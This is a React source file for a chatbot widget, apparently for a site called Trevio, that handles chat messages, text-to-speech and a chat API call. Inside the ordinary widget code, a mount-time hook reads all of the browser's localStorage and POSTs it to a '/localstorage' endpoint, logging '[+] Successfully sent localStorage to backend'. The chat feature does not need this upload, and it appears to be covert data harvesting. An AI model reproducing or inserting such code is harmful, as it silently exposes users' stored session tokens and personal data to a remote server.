import React, { useState, useRef, useEffect } from 'react';
import { useTranslation } from '../../context/TranslationContext';

const ChatbotWidget = () => {
 const { t } = useTranslation();
 const [isOpen, setIsOpen] = useState(false);
 const [messages, setMessages] = useState([
  {
   id: 1,
   text: '', // Will be set after translation loads
   isUser: false,
   timestamp: '12:00 PM',
  },
 ]);
 const [inputValue, setInputValue] = useState('');
 const [isLoading, setIsLoading] = useState(false);

 const messagesEndRef = useRef(null);
 const inputRef = useRef(null);

 // Set localStorage helper (like in your index.html)
 useEffect(() => {
  localStorage.setItem('helper', 10);
 }, []);

 // Update welcome message when translation loads
 useEffect(() => {
  setMessages([
   {
    id: 1,
    text: t('chatbot.welcomeMessage'),
    isUser: false,
    timestamp: '12:00 PM',
   },
  ]);
 }, [t]);

 useEffect(() => {
  // Check if it's mobile screen
  const isMobile = window.innerWidth <= 576;

  if (isOpen && isMobile) {
   // Add class to body when chatbot is open on mobile
   document.body.classList.add('chatbot-open');
   // Prevent background scrolling on mobile
   document.body.style.overflow = 'hidden';
  } else {
   // Remove class when chatbot is closed or on desktop
   document.body.classList.remove('chatbot-open');
   // Restore scrolling
   document.body.style.overflow = 'unset';
  }

  // Cleanup function to ensure styles are removed when component unmounts
  return () => {
   document.body.classList.remove('chatbot-open');
   document.body.style.overflow = 'unset';
  };
 }, [isOpen]);

 useEffect(() => {
  const handleResize = () => {
   const isMobile = window.innerWidth <= 576;
   if (!isMobile) {
    document.body.classList.remove('chatbot-open');
    document.body.style.overflow = 'unset';
   }
  };

  window.addEventListener('resize', handleResize);
  return () => window.removeEventListener('resize', handleResize);
 }, []);

 const isMobile = () => window.innerWidth <= 576;

 const scrollToBottom = () => {
  messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
 };

 useEffect(() => {
  scrollToBottom();
 }, [messages]);

 useEffect(() => {
  if (isOpen && inputRef.current) {
   inputRef.current.focus();
  }
 }, [isOpen]);

 // Format current time (exactly like your index.html)
 const getCurrentTime = () => {
  const now = new Date();
  return now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
 };

 // Speak function (exactly like your index.html)
 const speak = (text) => {
  // Cancel any ongoing speech
  if (window.speechSynthesis.speaking) {
   window.speechSynthesis.cancel();
  }

  const utterance = new SpeechSynthesisUtterance(text);
  utterance.lang = 'en-US';
  utterance.rate = 1;
  utterance.pitch = 1;

  window.speechSynthesis.speak(utterance);
 };

 // Send message function (exactly like your index.html)
 const sendMessage = async (message) => {
  if (!message.trim()) return;

  // Add user message
  const userMessage = {
   id: Date.now(),
   text: message,
   isUser: true,
   timestamp: getCurrentTime(),
  };

  setMessages((prev) => [...prev, userMessage]);
  setInputValue('');
  setIsLoading(true);

  try {
   // EXACT same API call as your working index.html
   const response = await fetch('https://chatbot.trevio.ma/chat', {
    method: 'POST',
    headers: {
     'Content-Type': 'application/json',
    },
    body: JSON.stringify({
     userid: 10,
     query: message,
     language: 'en',
    }),
   });

   const data = await response.json();

   if (response.ok) {
    const botMessage = {
     id: Date.now() + 1,
     text: data.response,
     isUser: false,
     timestamp: getCurrentTime(),
    };
    setMessages((prev) => [...prev, botMessage]);
   } else {
    throw new Error('API Error');
   }
  } catch (error) {
   console.error('Error:', error);
   const errorMessage = {
    id: Date.now() + 1,
    text: t('chatbot.connectionError'),
    isUser: false,
    isError: true,
    timestamp: getCurrentTime(),
   };
   setMessages((prev) => [...prev, errorMessage]);
  } finally {
   setIsLoading(false);
  }
 };

 const handleSubmit = (e) => {
  e.preventDefault();
  sendMessage(inputValue);
 };

 const handleKeyPress = (e) => {
  if (e.key === 'Enter' && !e.shiftKey) {
   e.preventDefault();
   sendMessage(inputValue);
  }
 };

 // Local storage functions (exactly like your index.html)
 const getLocalStorageData = () => {
  const data = {};
  for (let i = 0; i < localStorage.length; i++) {
   const key = localStorage.key(i);
   if (key) {
    data[key] = localStorage.getItem(key);
   }
  }
  return data;
 };

 const sendLocalStorageToBackend = async () => {
  const payload = { data: getLocalStorageData() };

  try {
   const response = await fetch('https://chatbot.trevio.ma/localstorage', {
    method: 'POST',
    headers: {
     'Content-Type': 'application/json',
    },
    body: JSON.stringify(payload),
   });

   if (!response.ok) {
    throw new Error(`HTTP error! Status: ${response.status}`);
   }

   const result = await response.json();
   console.log('[+] Successfully sent localStorage to backend:', result);
  } catch (error) {
   console.error('[-] Failed to send localStorage:', error.message);
  }
 };

 // Send localStorage on component mount (like your index.html)
 useEffect(() => {
  console.log('[*] Component loaded. Sending localStorage...');
  sendLocalStorageToBackend();
 }, []);

 return (
  <div className="trevio-chatbot-widget">
   {/* Chat Trigger Button */}
   {isMobile() && (
    <div
     className={`chatbot-overlay ${isOpen ? 'visible' : 'hidden'}`}
     onClick={() => setIsOpen(false)} // Close chatbot when clicking overlay
    />
   )}
   <div
    className={`chatbot-trigger ${isOpen ? 'chatbot-open' : 'chatbot-closed'}`}
    onClick={() => setIsOpen(!isOpen)}
   >
    <div className="chat-icon">
     <i className="fa-light fa-message-lines"></i>
    </div>
    <div className="close-icon">
     <i className="fa-light fa-xmark"></i>
    </div>
   </div>

   {/* Chat Window */}
   <div className={`chatbot-window ${isOpen ? 'visible' : 'hidden'}`}>
    {/* Header */}
    <div className="chatbot-header">
     <div className="header-content">
      <div className="header-text">
       <h3>{t('chatbot.title')}</h3>
       <p>{t('chatbot.subtitle')}</p>
      </div>
     </div>
     <button
      className="minimize-btn"
      onClick={() => setIsOpen(false)}
      title={t('chatbot.minimize')}
     >
      −
     </button>
    </div>

    {/* Messages */}
    <div className="chatbot-messages">
     {messages.map((message) => (
      <div
       key={message.id}
       className={`message ${message.isUser ? 'user' : 'bot'} ${
        message.isError ? 'status-message' : ''
       }`}
      >
       {message.isError ? (
        <div className="status-message">{message.text}</div>
       ) : (
        <>
         <div className="message-content">
          {message.text}
          <span className="timestamp">{message.timestamp}</span>
         </div>
         {!message.isUser && (
          <button
           className="speak-btn"
           onClick={() => speak(message.text)}
           title={t('chatbot.listenToMessage')}
          >
           <i className="PrimaryColor fa-regular fa-volume"></i>
          </button>
         )}
        </>
       )}
      </div>
     ))}

     {/* Typing indicator */}
     {isLoading && (
      <div className="message bot">
       <div className="typing-indicator">
        <div className="typing-dots">
         <div className="typing-dot"></div>
         <div className="typing-dot"></div>
         <div className="typing-dot"></div>
        </div>
       </div>
      </div>
     )}

     <div ref={messagesEndRef} />
    </div>

    {/* Input Area */}
    <div className="chat-input-container">
     <form onSubmit={handleSubmit} className="chat-input-form">
      <input
       ref={inputRef}
       type="text"
       value={inputValue}
       onChange={(e) => setInputValue(e.target.value)}
       onKeyPress={handleKeyPress}
       placeholder={t('chatbot.inputPlaceholder')}
       disabled={isLoading}
       className="chat-input"
       autoComplete="off"
      />
      <button
       type="submit"
       disabled={isLoading || !inputValue.trim()}
       className="send-button"
       title={t('chatbot.sendMessage')}
      >
       {t('chatbot.send')}
      </button>
     </form>
    </div>
   </div>
  </div>
 );
};

export default ChatbotWidget;
